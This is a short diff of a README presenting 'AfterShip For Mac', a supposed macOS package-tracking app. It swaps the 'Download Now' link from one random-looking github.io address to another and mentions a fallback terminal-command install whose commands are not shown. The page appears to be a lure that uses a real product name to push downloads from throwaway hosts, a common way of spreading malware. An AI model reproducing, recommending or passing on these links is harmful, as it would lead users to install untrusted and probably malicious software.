@@ -3,7 +3,7 @@
 
 AfterShip For Mac is a powerful shipment tracking app designed for macOS, enabling eCommerce businesses and consumers to track packages from over 1,100 carriers worldwide. Monitor deliveries, receive real-time updates, and enhance customer experience with seamless integrations. Follow the instructions below to download and install AfterShip For Mac effortlessly.[](https://webcatalog.io/en/apps/aftership)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-00A1D6?style=for-the-badge&logo=package)](https://fituganshfgh.github.io/.github/after)
+[![Download Now](https://img.shields.io/badge/Download-Now-00A1D6?style=for-the-badge&logo=package)](https://mrboomzeus519.github.io/gimronus/after)
 
 If you encounter issues downloading via the button above, follow the terminal command instructions below.
 
